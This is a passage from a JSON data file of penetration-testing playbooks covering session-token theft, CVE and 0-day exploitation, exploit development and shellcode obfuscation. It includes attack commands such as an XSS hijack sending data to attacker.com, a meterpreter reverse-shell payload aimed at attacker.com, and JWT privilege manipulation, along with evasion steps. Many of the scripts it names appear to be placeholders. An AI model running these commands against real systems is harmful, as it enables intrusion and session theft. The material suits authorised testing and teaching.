        "description": "Technical deep dive into pass-the-hash attack techniques"
      }
    ]
  },
  {
    "id": "playbook_token_theft_session_hijacking",
    "name": "Token Theft & Session Hijacking",
    "summary": "Advanced session hijacking playbook covering token extraction, manipulation, and hijacking techniques across web applications and APIs.",
    "details": "This playbook provides comprehensive coverage of session token theft, manipulation, and hijacking techniques. Includes web session hijacking, JWT token exploitation, API session abuse, and mobile session capture. Features decision trees for token validation, bypass strategies, and persistence mechanisms.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Session hijacking and token analysis tools",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y wireshark tshark bettercap mitmproxy",
            "copyable": true
          },
          {
            "detail": "pip3 install jwt-tool burp-suite-api requests-oauthlib",
            "copyable": true
          },
          {
            "detail": "git clone https://github.com/RUB-NDS/CORStool.git && cd CORStool && pip3 install -r requirements.txt",
            "copyable": true
          },
          {
            "detail": "npm install -g jwt-cracker cookie-parser",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Complete session hijacking toolkit",
        "steps": [
          {
            "detail": "sudo apt install -y wireshark tshark bettercap mitmproxy burpsuite",
            "copyable": true
          },
          {
            "detail": "apt install -y cookie-cadger ferret-sidejack sslstrip",
            "copyable": true
          },
          {
            "detail": "pip3 install jwt-tool flask-unsign python-oauth2",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker",
        "summary": "Containerized session analysis tools",
        "steps": [
          {
            "detail": "docker pull mitmproxy/mitmproxy",
            "copyable": true
          },
          {
            "detail": "docker pull bettercap/bettercap",
            "copyable": true
          },
          {
            "detail": "docker run -p 8080:8080 -p 8081:8081 mitmproxy/mitmproxy",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "JWT token analysis",
        "command": "python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9... -I",
        "notes": [
          "Analyze JWT header, payload, and signature for vulnerabilities"
        ]
      },
      {
        "description": "Network session capture",
        "command": "tshark -i eth0 -Y 'http.cookie' -T fields -e http.cookie -e http.request.uri > ~/pt-journal-sessions/*/evidence/sessions.txt",
        "notes": [
          "Capture session cookies and tokens from network traffic"
        ]
      }
    ],
    "step_sequences": [
      {
        "title": "Phase 1: Session Token Discovery",
        "steps": [
          {
            "title": "Network Traffic Analysis",
            "details": "Capture and analyze network traffic for session tokens",
            "command": "tshark -i eth0 -Y 'http.cookie or http.authorization' -w ~/pt-journal-sessions/*/evidence/session_traffic.pcap"
          },
          {
            "title": "Browser Storage Inspection",
            "details": "Extract tokens from browser storage mechanisms",
            "command": "python3 browser_token_dump.py --profile /path/to/profile --output ~/pt-journal-sessions/*/evidence/browser_tokens.txt"
          },
          {
            "title": "Mobile App Analysis",
            "details": "Extract session tokens from mobile applications",
            "command": "frida -U -f com.target.app -l extract_tokens.js > ~/pt-journal-sessions/*/evidence/mobile_tokens.txt"
          },
          {
            "title": "API Session Enumeration",
            "details": "Identify API authentication mechanisms and tokens",
            "command": "python3 api_token_enum.py --target api.target.com --endpoints endpoints.txt --output ~/pt-journal-sessions/*/evidence/api_tokens.txt"
          }
        ]
      },
      {
        "title": "Phase 2: Token Analysis & Validation",
        "steps": [
          {
            "title": "JWT Token Analysis",
            "details": "Analyze JWT tokens for cryptographic weaknesses",
            "command": "python3 jwt_tool.py JWT_TOKEN -I -a HS256 -c /path/to/cert.pem"
          },
          {
            "title": "Session Cookie Analysis",
            "details": "Analyze session cookies for predictability and weaknesses",
            "command": "python3 cookie_analyzer.py --cookies cookies.txt --entropy-check --pattern-analysis"
          },
          {
            "title": "Token Validation Testing",
            "details": "Test token validation mechanisms for bypass opportunities",
            "command": "python3 token_validation_test.py --target target.com --token-type jwt --bypass-tests"
          },
          {
            "title": "Session Fixation Testing",
            "details": "Test for session fixation vulnerabilities",
            "command": "python3 session_fixation_test.py --target target.com --login-endpoint /login"
          }
        ]
      },
      {
        "title": "Phase 3: Token Manipulation & Hijacking",
        "steps": [
          {
            "title": "Session Token Replay",
            "details": "Replay captured session tokens for unauthorized access",
            "command": "curl -H 'Cookie: SESSION_ID=captured_token' https://target.com/protected/resource"
          },
          {
            "title": "JWT Token Manipulation",
            "details": "Manipulate JWT claims to escalate privileges",
            "command": "python3 jwt_tool.py JWT_TOKEN -I -p -d '{\"role\": \"admin\", \"permissions\": [\"all\"]}'"
          },
          {
            "title": "OAuth Token Abuse",
            "details": "Abuse OAuth tokens for unauthorized API access",
            "command": "python3 oauth_abuse.py --token oauth_token --api-endpoint https://api.target.com/v1/"
          },
          {
            "title": "Cross-Site Session Hijacking",
            "details": "Implement XSS-based session hijacking",
            "command": "python3 xss_session_hijack.py --target target.com --payload-type stored --exfiltrate-to https://attacker.com/collect"
          }
        ]
      },
      {
        "title": "Phase 4: Session Persistence & Evasion",
        "steps": [
          {
            "title": "Session Token Injection",
            "details": "Inject persistent session tokens for long-term access",
            "command": "python3 session_inject.py --target target.com --token persistent_token --injection-point cookie"
          },
          {
            "title": "Token Refresh Chain",
            "details": "Implement token refresh chain for continuous access",
            "command": "python3 token_refresh_chain.py --refresh-endpoint /auth/refresh --initial-token token --output ~/pt-journal-sessions/*/evidence/refresh_chain.txt"
          },
          {
            "title": "Session State Manipulation",
            "details": "Manipulate server-side session state for privilege escalation",
            "command": "python3 session_state_manipulation.py --target target.com --session-id session_id --desired-state admin"
          },
          {
            "title": "Anti-Detection Evasion",
            "details": "Implement techniques to evade session hijacking detection",
            "command": "python3 session_evasion.py --target target.com --stealth-mode rotate-user-agent --timing human-like"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Web Application Session Hijacking Pipeline",
        "stages": [
          {
            "label": "Day 1: Token Discovery",
            "description": "Capture and analyze session tokens from multiple sources",
            "command": "tshark -i eth0 -Y 'http.cookie' -w ~/pt-journal-sessions/*/evidence/traffic.pcap && python3 browser_dump.py --profile default"
          },
          {
            "label": "Day 2: Token Analysis",
            "description": "Analyze captured tokens for vulnerabilities",
            "command": "python3 analyze_tokens.py --input ~/pt-journal-sessions/*/evidence/ --output ~/pt-journal-sessions/*/evidence/vulnerabilities.txt"
          },
          {
            "label": "Day 3: Exploitation",
            "description": "Exploit token vulnerabilities for unauthorized access",
            "command": "python3 exploit_tokens.py --vulnerabilities ~/pt-journal-sessions/*/evidence/vulnerabilities.txt --target target.com"
          },
          {
            "label": "Day 4: Persistence",
            "description": "Establish persistent session access",
            "command": "python3 establish_persistence.py --compromised-tokens tokens.txt --persistence-method refresh-chain"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "JWT token with 'none' algorithm",
        "meaning": "Critical vulnerability allowing token forgery",
        "severity": "Critical"
      },
      {
        "indicator": "Session cookie with sequential pattern",
        "meaning": "Predictable session IDs vulnerable to brute force",
        "severity": "High"
      },
      {
        "indicator": "OAuth token with excessive scopes",
        "meaning": "Over-privileged token providing broad access",
        "severity": "High"
      },
      {
        "indicator": "Session fixation successful",
        "meaning": "Ability to set user session before authentication",
        "severity": "High"
      },
      {
        "indicator": "Token replay accepted",
        "meaning": "Lack of nonce/timestamp validation in tokens",
        "severity": "Medium"
      }
    ],
    "advanced_usage": [
      {
        "title": "Custom Token Manipulation",
        "scenario": "Develop custom token manipulation scripts for proprietary formats",
        "command": "python3 custom_token_toolkit.py --format proprietary --input token.bin --manipulation escalate-privileges",
        "notes": [
          "Reverse engineer proprietary token formats before manipulation"
        ]
      },
      {
        "title": "Distributed Session Hijacking",
        "scenario": "Coordinate session hijacking across multiple compromised systems",
        "command": "python3 distributed_hijack.py --nodes compromised_hosts.txt --target-api api.target.com --synchronize-sessions",
        "notes": [
          "Maintain session synchronization across distributed nodes"
        ]
      },
      {
        "title": "AI-Powered Token Prediction",
        "scenario": "Use machine learning to predict sequential session tokens",
        "command": "python3 token_predictor.py --training-data captured_tokens.txt --model lstm --predict-next 100",
        "notes": [
          "Train models on sufficient token samples for accurate prediction"
        ]
      }
    ],
    "comparison_table": {
      "caption": "Session Hijacking Tools Comparison",
      "columns": ["Tool", "Token Types", "Network Analysis", "Automation", "Stealth"],
      "rows": [
        ["Burp Suite", "Web tokens", "Excellent", "High", "Medium"],
        ["OWASP ZAP", "Web tokens", "Good", "High", "Medium"],
        ["Bettercap", "All types", "Excellent", "Medium", "High"],
        ["JWT Tool", "JWT only", "None", "High", "High"],
        ["Custom Scripts", "Any", "Variable", "Very High", "Very High"]
      ]
    },
    "resources": [
      {
        "label": "OWASP Session Management Cheat Sheet",
        "url": "https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html",
        "description": "Comprehensive guide to session management vulnerabilities"
      },
      {
        "label": "JWT Security Best Practices",
        "url": "https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/",
        "description": "JWT security vulnerabilities and prevention techniques"
      },
      {
        "label": "Session Hijacking Legal Framework",
        "url": "https://www.sans.org/white-papers/36846/",
        "description": "Legal considerations for session hijacking testing"
      }
    ]
  },
  {
    "id": "playbook_zero_day_cve_exploitation",
    "name": "0-Day/CVE Exploitation Pipeline",
    "summary": "Comprehensive vulnerability exploitation playbook covering CVE discovery, exploit development, and 0-day vulnerability research workflows.",
    "details": "This playbook provides end-to-end coverage of vulnerability exploitation from CVE research to 0-day discovery and exploit development. Includes vulnerability analysis, exploit chaining, and strategic deployment. Features decision trees for exploit selection, target prioritization, and impact assessment.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Vulnerability research and exploitation tools",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y gdb radare2 pwntools binary-ninja-community",
            "copyable": true
          },
          {
            "detail": "pip3 install pwntools ropper angr capstone keystone-engine",
            "copyable": true
          },
          {
            "detail": "git clone https://github.com/exploit-development/exploit-dev-toolkit.git && cd exploit-dev-toolkit && pip3 install -r requirements.txt",
            "copyable": true
          },
          {
            "detail": "wget https://github.com/GDSSecurity/Windows-Exploit-Suggester/archive/master.zip && unzip master.zip",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Complete exploit development environment",
        "steps": [
          {
            "detail": "sudo apt install -y gdb radare2 pwntools ropper angr binary-ninja",
            "copyable": true
          },
          {
            "detail": "apt install -y exploitdb searchsploit metasploit-framework",
            "copyable": true
          },
          {
            "detail": "pip3 install keystone-engine capstone unicorn z3-solver",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker",
        "summary": "Containerized exploit development environment",
        "steps": [
          {
            "detail": "docker pull pwntools/pwntools",
            "copyable": true
          },
          {
            "detail": "docker pull radareorg/radare2",
            "copyable": true
          },
          {
            "detail": "docker run -it --cap-add=SYS_PTRACE --security-opt seccomp=unconfined pwntools/pwntools",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "CVE vulnerability lookup",
        "command": "searchsploit CVE-2024-1234 && echo 'CVE details and exploits found'",
        "notes": [
          "Search for existing exploits before developing new ones"
        ]
      },
      {
        "description": "Binary vulnerability analysis",
        "command": "r2 -A ~/pt-journal-sessions/*/evidence/vulnerable_binary && aaa && pdf@@sym && pdf@@imports",
        "notes": [
          "Use radare2 for comprehensive binary analysis"
        ]
      }
    ],
    "step_sequences": [
      {
        "title": "Phase 1: Vulnerability Discovery",
        "steps": [
          {
            "title": "CVE Intelligence Gathering",
            "details": "Monitor new CVE disclosures and assess exploitability",
            "command": "python3 cve_monitor.py --sources nvd,cve,exploitdb --severity critical,high --output ~/pt-journal-sessions/*/evidence/cve_feed.txt"
          },
          {
            "title": "Target System Fingerprinting",
            "details": "Identify vulnerable software versions and configurations",
            "command": "nmap -sV --script vuln target.com -o ~/pt-journal-sessions/*/evidence/vuln_scan.txt"
          },
          {
            "title": "0-Day Research Setup",
            "details": "Set up environment for novel vulnerability research",
            "command": "python3 research_setup.py --target-type web_app --fuzzing-tools afl,libfuzzer --analysis-tools angr,symbolic"
          },
          {
            "title": "Vulnerability Scanning",
            "details": "Comprehensive vulnerability assessment",
            "command": "nuclei -l targets.txt -t cves/ -o ~/pt-journal-sessions/*/evidence/nuclei_cves.txt"
          }
        ]
      },
      {
        "title": "Phase 2: Vulnerability Analysis",
        "steps": [
          {
            "title": "Binary Reverse Engineering",
            "details": "Analyze binary code for vulnerability patterns",
            "command": "r2 -A ~/pt-journal-sessions/*/evidence/target_binary && 'afl~pattern' && 'pdf~*'"
          },
          {
            "title": "Static Code Analysis",
            "details": "Analyze source code for security flaws",
            "command": "python3 static_analysis.py --source target_app/ --patterns buffer_overflow,sql_injection,xss --output ~/pt-journal-sessions/*/evidence/static_vulns.txt"
          },
          {
            "title": "Dynamic Analysis Setup",
            "details": "Configure dynamic analysis environment",
            "command": "gdb ~/pt-journal-sessions/*/evidence/target_binary -ex 'set disassembly-flavor intel' -ex 'layout asm'"
          },
          {
            "title": "Fuzzing Campaign",
            "details": "Automated fuzzing for vulnerability discovery",
            "command": "afl-fuzz -i input_dir -o ~/pt-journal-sessions/*/evidence/fuzz_results/ -M fuzzer01 ~/pt-journal-sessions/*/evidence/target_binary @@"
          }
        ]
      },
      {
        "title": "Phase 3: Exploit Development",
        "steps": [
          {
            "title": "Exploit Template Generation",
            "details": "Generate exploit templates based on vulnerability type",
            "command": "python3 exploit_template.py --vuln-type buffer_overflow --arch x64 --template python"
          },
          {
            "title": "Shellcode Development",
            "details": "Develop custom shellcode for target platform",
            "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker.com LPORT=4444 -f python -o ~/pt-journal-sessions/*/evidence/shellcode.py"
          },
          {
            "title": "Exploit Testing",
            "details": "Test exploit against isolated target environment",
            "command": "python3 exploit.py --target 192.168.1.100 --port 8080 --debug --payload ~/pt-journal-sessions/*/evidence/shellcode.py"
          },
          {
            "title": "Exploit Optimization",
            "details": "Optimize exploit for reliability and stealth",
            "command": "python3 optimize_exploit.py --input exploit.py --optimizations reliability,stealth,size"
          }
        ]
      },
      {
        "title": "Phase 4: Strategic Deployment",
        "steps": [
          {
            "title": "Attack Vector Selection",
            "details": "Select optimal attack vector based on target environment",
            "command": "python3 vector_selector.py --target-info target_analysis.txt --exploits available_exploits.txt --output ~/pt-journal-sessions/*/evidence/selected_vector.txt"
          },
          {
            "title": "Exploit Chaining",
            "details": "Chain multiple exploits for maximum impact",
            "command": "python3 exploit_chainer.py --exploits exploit_list.txt --chain-strategy privilege_escalation --output ~/pt-journal-sessions/*/evidence/exploit_chain.py"
          },
          {
            "title": "Impact Assessment",
            "details": "Assess potential impact and collateral damage",
            "command": "python3 impact_assessment.py --exploit exploit.py --target-network 192.168.1.0/24 --output ~/pt-journal-sessions/*/evidence/impact_report.txt"
          },
          {
            "title": "Coordinated Deployment",
            "details": "Deploy exploit with timing and coordination",
            "command": "python3 deploy_exploit.py --exploit exploit_chain.py --target-list targets.txt --timing stealth --backup-exit"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "CVE Exploitation Research Pipeline",
        "stages": [
          {
            "label": "Day 1: CVE Monitoring",
            "description": "Monitor new CVE disclosures and assess relevance",
            "command": "python3 cve_monitor.py --severity critical --target-software apache,nginx --output ~/pt-journal-sessions/*/evidence/relevant_cves.txt"
          },
          {
            "label": "Day 2-3: Vulnerability Analysis",
            "description": "Analyze target systems for CVE presence",
            "command": "nmap -sV --script vuln target_network/24 -o ~/pt-journal-sessions/*/evidence/vuln_assessment.txt"
          },
          {
            "label": "Day 4-5: Exploit Development",
            "description": "Develop or customize exploits for identified vulnerabilities",
            "command": "python3 develop_exploit.py --cve CVE-2024-1234 --target target.com --shellcode custom"
          },
          {
            "label": "Day 6: Validation & Deployment",
            "description": "Validate exploit effectiveness and deploy strategically",
            "command": "python3 validate_deploy.py --exploit exploit.py --target target.com --impact-assessment"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "Buffer overflow detected in function X at offset Y",
        "meaning": "Memory corruption vulnerability exploitable for code execution",
        "severity": "Critical"
      },
      {
        "indicator": "Use-after-free vulnerability identified",
        "meaning": "Advanced memory corruption requiring sophisticated exploit",
        "severity": "Critical"
      },
      {
        "indicator": "Remote code execution achieved",
        "meaning": "Successful exploitation providing system access",
        "severity": "Critical"
      },
      {
        "indicator": "Privilege escalation successful",
        "meaning": "Exploit chain elevated privileges to admin/root",
        "severity": "Critical"
      },
      {
        "indicator": "0-Day vulnerability discovered",
        "meaning": "Novel vulnerability requiring responsible disclosure",
        "severity": "Critical"
      }
    ],
    "advanced_usage": [
      {
        "title": "Automated Exploit Generation",
        "scenario": "Use AI/ML for automated exploit development",
        "command": "python3 ai_exploit_generator.py --vulnerability crash_dump.bin --target-arch x64 --output auto_exploit.py",
        "notes": [
          "Validate generated exploits thoroughly before deployment"
        ]
      },
      {
        "title": "Advanced Fuzzing Techniques",
        "scenario": "Implement coverage-guided and symbolic execution fuzzing",
        "command": "afl-fuzz -i input/ -o output/ -M main -d ~/pt-journal-sessions/*/evidence/target_binary @@ && python3 symbolic_fuzz.py --target binary --constraints constraints.txt",
        "notes": [
          "Combine multiple fuzzing approaches for comprehensive coverage"
        ]
      },
      {
        "title": "Exploit Obfuscation",
        "scenario": "Develop anti-analysis and evasion techniques",
        "command": "python3 exploit_obfuscator.py --input exploit.py --techniques polymorphism,anti-debug,encryption --output obfuscated_exploit.py",
        "notes": [
          "Test obfuscated exploits against security solutions"
        ]
      }
    ],
    "comparison_table": {
      "caption": "Exploitation Tools Comparison",
      "columns": ["Tool", "Vulnerability Types", "Automation", "Learning Curve", "Effectiveness"],
      "rows": [
        ["Metasploit", "Known CVEs", "High", "Low", "High"],
        ["Pwntools", "Custom", "Medium", "Medium", "Very High"],
        ["Radare2", "Binary Analysis", "Low", "High", "Very High"],
        ["AFL", "Fuzzing", "High", "Medium", "High"],
        ["Custom Frameworks", "Any", "Variable", "Very High", "Variable"]
      ]
    },
    "resources": [
      {
        "label": "CVE Database",
        "url": "https://cve.mitre.org/",
        "description": "Official CVE database and vulnerability information"
      },
      {
        "label": "Exploit Database",
        "url": "https://www.exploit-db.com/",
        "description": "Comprehensive archive of exploits and vulnerability research"
      },
      {
        "label": "Responsible Disclosure Guidelines",
        "url": "https://vuls.cert.org/confluence/display/RD",
        "description": "Industry guidelines for responsible vulnerability disclosure"
      }
    ]
  },
  {
    "id": "playbook_exploit_development_workflow",
    "name": "Exploit Development Workflow",
    "summary": "Systematic exploit development methodology covering vulnerability research, payload development, and reliability engineering.",
    "details": "This playbook provides a comprehensive framework for exploit development from vulnerability discovery to reliable deployment. Covers reverse engineering, shellcode development, exploit stability testing, and multi-platform compatibility. Includes decision trees for exploit strategy selection and optimization techniques.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Exploit development and reverse engineering tools",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y gdb gdb-multiarch radare2 pwntools",
            "copyable": true
          },
          {
            "detail": "pip3 install pwntools ropper angr capstone keystone-engine unicorn",
            "copyable": true
          },
          {
            "detail": "git clone https://github.com/JonathanSalwan/ROPgadget.git && cd ROPgadget && python3 setup.py install",
            "copyable": true
          },
          {
            "detail": "wget https://github.com/zodiacon/WinAppDbg/releases/download/v1.6/WinAppDbg.zip && unzip WinAppDbg.zip",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Complete exploit development environment",
        "steps": [
          {
            "detail": "sudo apt install -y gdb radare2 pwntools ropper angr keystone-engine",
            "copyable": true
          },
          {
            "detail": "apt install -y gef gdb-peda pwndbg binary-ninja-community",
            "copyable": true
          },
          {
            "detail": "pip3 install unicorn z3-solver fileformat pefile",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker",
        "summary": "Containerized exploit development environment",
        "steps": [
          {
            "detail": "docker pull pwntools/pwntools",
            "copyable": true
          },
          {
            "detail": "docker pull radareorg/radare2",
            "copyable": true
          },
          {
            "detail": "docker run -it --cap-add=SYS_PTRACE --security-opt seccomp=unconfined -v $(pwd)/exploits:/exploits pwntools/pwntools",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Quick ROP chain generation",
        "command": "ROPgadget --binary ~/pt-journal-sessions/*/evidence/target_binary --ropchain",
        "notes": [
          "Automatically generate ROP chains for bypassing DEP/NX"
        ]
      },
      {
        "description": "Pattern offset calculation",
        "command": "python3 -c 'from pwn import *; print(cyclic(100).find(b\"AAAABBBB\"))'",
        "notes": [
          "Calculate offset for buffer overflow vulnerabilities"
        ]
      }
    ],
    "step_sequences": [
      {
        "title": "Phase 1: Vulnerability Analysis",
        "steps": [
          {
            "title": "Crash Reproduction",
            "details": "Reproduce and analyze the vulnerability crash",
            "command": "gdb ~/pt-journal-sessions/*/evidence/vulnerable_binary -ex 'run input_file' -ex 'bt' -ex 'info registers'"
          },
          {
            "title": "Memory Layout Analysis",
            "details": "Analyze memory layout and protection mechanisms",
            "command": "python3 memory_analyzer.py --binary target_binary --protections nx,aslr,canary --output ~/pt-journal-sessions/*/evidence/memory_layout.txt"
          },
          {
            "title": "Control Flow Analysis",
            "details": "Analyze control flow and identify exploitation primitives",
            "command": "r2 -AA ~/pt-journal-sessions/*/evidence/target_binary && 'afl~call' && 'pdf~jump'"
          },
          {
            "title": "Information Leak Identification",
            "details": "Identify information leaks for bypassing protections",
            "command": "python3 info_leak_scanner.py --binary target_binary --output ~/pt-journal-sessions/*/evidence/info_leaks.txt"
          }
        ]
      },
      {
        "title": "Phase 2: Exploit Strategy Development",
        "steps": [
          {
            "title": "Exploit Primitive Selection",
            "details": "Select optimal exploitation primitives based on analysis",
            "command": "python3 exploit_strategist.py --vulnerability buffer_overflow --protections nx,aslr --output ~/pt-journal-sessions/*/evidence/exploit_strategy.txt"
          },
          {
            "title": "ROP Chain Development",
            "details": "Develop ROP chains for bypassing DEP/NX protections",
            "command": "ROPgadget --binary target_binary --ropchain --output ~/pt-journal-sessions/*/evidence/rop_chain.txt"
          },
          {
            "title": "Shellcode Development",
            "details": "Develop custom shellcode for the target platform",
            "command": "msfvenom -p linux/x64/exec CMD=/bin/sh -f python -o ~/pt-journal-sessions/*/evidence/shellcode.py"
          },
          {
            "title": "Bypass Technique Selection",
            "details": "Select techniques for bypassing security protections",
            "command": "python3 bypass_selector.py --protections canary,aslr,nx --techniques ret2libc,rop,info_leak"
          }
        ]
      },
      {
        "title": "Phase 3: Exploit Implementation",
        "steps": [
          {
            "title": "Exploit Template Creation",
            "details": "Create exploit template with Pwntools framework",
            "command": "python3 exploit_template.py --vuln-type buffer_overflow --arch x64 --template pwntools --output exploit.py"
          },
          {
            "title": "Payload Integration",
            "details": "Integrate shellcode and ROP chains into exploit",
            "command": "python3 payload_integrator.py --exploit exploit.py --shellcode shellcode.py --rop-chain rop_chain.txt"
          },
          {
            "title": "Address Leak Implementation",
            "details": "Implement address leak techniques for ASLR bypass",
            "command": "python3 address_leak.py --exploit exploit.py --leak-method format_string --output final_exploit.py"
          },
          {
            "title": "Multi-Platform Compatibility",
            "details": "Ensure exploit works across different platforms/versions",
            "command": "python3 compat_tester.py --exploit final_exploit.py --platforms ubuntu18,ubuntu20,ubuntu22 --output ~/pt-journal-sessions/*/evidence/compatibility.txt"
          }
        ]
      },
      {
        "title": "Phase 4: Reliability & Optimization",
        "steps": [
          {
            "title": "Exploit Stability Testing",
            "details": "Test exploit reliability across multiple runs",
            "command": "python3 stability_tester.py --exploit final_exploit.py --iterations 100 --output ~/pt-journal-sessions/*/evidence/stability_report.txt"
          },
          {
            "title": "Race Condition Handling",
            "details": "Handle race conditions and timing issues",
            "command": "python3 race_handler.py --exploit final_exploit.py --timing-adjustments --output stable_exploit.py"
          },
          {
            "title": "Error Recovery Implementation",
            "details": "Implement error recovery and fallback mechanisms",
            "command": "python3 error_recovery.py --exploit stable_exploit.py --fallback-strategies --output robust_exploit.py"
          },
          {
            "title": "Performance Optimization",
            "details": "Optimize exploit for speed and stealth",
            "command": "python3 optimize_exploit.py --input robust_exploit.py --optimizations speed,stealth,size --output final_exploit.py"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Professional Exploit Development Pipeline",
        "stages": [
          {
            "label": "Day 1-2: Vulnerability Analysis",
            "description": "Comprehensive vulnerability and target analysis",
            "command": "gdb ~/pt-journal-sessions/*/evidence/target_binary -ex 'run crash_input' -ex 'bt full' -ex 'x/20x $esp' > ~/pt-journal-sessions/*/evidence/crash_analysis.txt"
          },
          {
            "label": "Day 3-4: Strategy Development",
            "description": "Develop exploitation strategy and primitives",
            "command": "python3 exploit_strategist.py --input ~/pt-journal-sessions/*/evidence/crash_analysis.txt --output ~/pt-journal-sessions/*/evidence/strategy.txt"
          },
          {
            "label": "Day 5-6: Exploit Implementation",
            "description": "Implement exploit with all bypass techniques",
            "command": "python3 exploit_builder.py --strategy ~/pt-journal-sessions/*/evidence/strategy.txt --output exploit.py"
          },
          {
            "label": "Day 7: Testing & Optimization",
            "description": "Test reliability and optimize for production",
            "command": "python3 optimize_exploit.py --input exploit.py --test-reliability 50 --optimize-all"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "Control of instruction pointer (EIP/RIP) achieved",
        "meaning": "Successful control flow hijacking, ready for shellcode execution",
        "severity": "High"
      },
      {
        "indicator": "ASLR bypass successful with information leak",
        "meaning": "Memory randomization defeated, exploit reliable",
        "severity": "High"
      },
      {
        "indicator": "DEP/NX bypassed with ROP chain",
        "meaning": "Data execution prevention bypassed, code execution possible",
        "severity": "High"
      },
      {
        "indicator": "Stack canary bypassed",
        "meaning": "Stack protection defeated, buffer overflow exploitable",
        "severity": "High"
      },
      {
        "indicator": "Exploit reliability: 95%+ success rate",
        "meaning": "Exploit is production-ready and stable",
        "severity": "Medium"
      }
    ],
    "advanced_usage": [
      {
        "title": "Automated Exploit Generation",
        "scenario": "Use symbolic execution for automated exploit generation",
        "command": "python3 symbolic_exploit.py --binary target_binary --crash_input crash.bin --output auto_exploit.py",
        "notes": [
          "Symbolic execution can automatically discover exploitation paths"
        ]
      },
      {
        "title": "Multi-Architecture Exploits",
        "scenario": "Develop exploits that work across multiple architectures",
        "command": "python3 multi_arch_exploit.py --target binary --architectures x86,x64,arm --output universal_exploit.py",
        "notes": [
          "Test thoroughly on all target architectures"
        ]
      },
      {
        "title": "Advanced Bypass Techniques",
        "scenario": "Implement advanced bypass techniques for modern protections",
        "command": "python3 advanced_bypass.py --exploit base_exploit.py --techniques ret2csu,partial_overwrite,sigreturn --output advanced_exploit.py",
        "notes": [
          "Advanced techniques require deep system knowledge"
        ]
      }
    ],
    "comparison_table": {
      "caption": "Exploit Development Tools Comparison",
      "columns": ["Tool", "Language", "Learning Curve", "Features", "Reliability"],
      "rows": [
        ["Pwntools", "Python", "Medium", "Comprehensive", "High"],
        ["Pwnlib", "Python", "Medium", "Good", "High"],
        ["ROPgadget", "Python", "Low", "ROP-focused", "Medium"],
        ["Custom Frameworks", "Any", "High", "Complete", "Variable"],
        ["Metasploit", "Ruby", "Low", "Standardized", "Very High"]
      ]
    },
    "resources": [
      {
        "label": "Exploit Development Tutorial",
        "url": "https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/",
        "description": "Comprehensive exploit development tutorial series"
      },
      {
        "label": "Pwntools Documentation",
        "url": "https://pwntools.readthedocs.io/",
        "description": "Complete documentation for Pwntools exploit development framework"
      },
      {
        "label": "Modern Binary Exploitation Course",
        "url": "https://github.com/RPISEC/MBE",
        "description": "University-level binary exploitation course materials"
      }
    ]
  },
  {
    "id": "playbook_shellcode_creation_obfuscation",
    "name": "Shellcode Creation & Obfuscation",
    "summary": "Advanced shellcode development and obfuscation playbook covering custom shellcode, polymorphic techniques, and evasion strategies.",
    "details": "This playbook provides comprehensive coverage of shellcode development from basic assembly to advanced polymorphic techniques. Includes custom shellcode creation, encoding/encryption, anti-analysis techniques, and multi-platform compatibility. Features decision trees for shellcode optimization and evasion strategy selection.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Shellcode development and assembly tools",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y nasm yasm gdb-multiarch",
            "copyable": true
          },
          {
            "detail": "pip3 install keystone-engine capstone unicorn pwntools",
            "copyable": true
          },
          {
            "detail": "git clone https://github.com/aerosol-can/Shellcodify.git && cd Shellcodify && python3 setup.py install",
            "copyable": true
          },
          {
            "detail": "wget https://github.com/rapid7/metasploit-framework/archive/master.zip && unzip master.zip",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Complete shellcode development environment",
        "steps": [
          {
            "detail": "sudo apt install -y nasm yasm keystone-framework capstone-toolkit",
            "copyable": true
          },
          {
            "detail": "apt install -y metasploit-framework pwntools libemu-dev",
            "copyable": true
          },
          {
            "detail": "pip3 install shellcode-tools scdbg unicorn",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker",
        "summary": "Containerized shellcode development environment",
        "steps": [
          {
            "detail": "docker pull keystone/keystone",
            "copyable": true
          },
          {
            "detail": "docker pull capstone-engine/capstone",
            "copyable": true
          },
          {
            "detail": "docker run -it -v $(pwd)/shellcode:/shellcode keystone/keystone bash",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Quick shellcode assembly",
        "command": "nasm -f bin64 shellcode.asm -o shellcode.bin && objdump -D -b binary -mi386:x86-64 shellcode.bin",
        "notes": [
          "Assemble shellcode and verify with objdump"
        ]
      },
      {
        "description": "Shellcode encoding with msfvenom",
        "command": "msfvenom -p linux/x64/exec CMD=/bin/sh -f raw -e x64/shikata_ga_nai -o encoded_shellcode.bin",
        "notes": [
          "Encode shellcode to avoid signature detection"
        ]
      }
    ],
    "step_sequences": [
      {
        "title": "Phase 1: Shellcode Development",
